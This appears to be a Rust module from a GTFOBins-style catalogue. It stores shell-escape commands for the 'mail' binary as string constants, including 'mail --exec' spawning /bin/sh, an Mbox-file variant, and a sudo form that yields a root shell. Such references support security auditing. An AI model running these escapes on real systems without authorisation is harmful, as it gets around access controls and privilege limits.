pub static BIN_NAME: &'static str = "mail";
pub static SH_DESC_1: &'static str = "GNU version only.";
pub static SH_CODE_1: &'static str = r#"
    
    mail --exec='!/bin/sh'
"#;
pub static SH_DESC_2: &'static str =
    "This creates a valid Mbox file which may be required by the binary.";
pub static SH_CODE_2: &'static str = r#"
    
    TF=$(mktemp)
    echo "From nobody@localhost $(date)" > $TF
    mail -f $TF
    !/bin/sh
"#;
pub static SUDO_DESC: &'static str = "GNU version only.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo mail --exec='!/bin/sh'
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
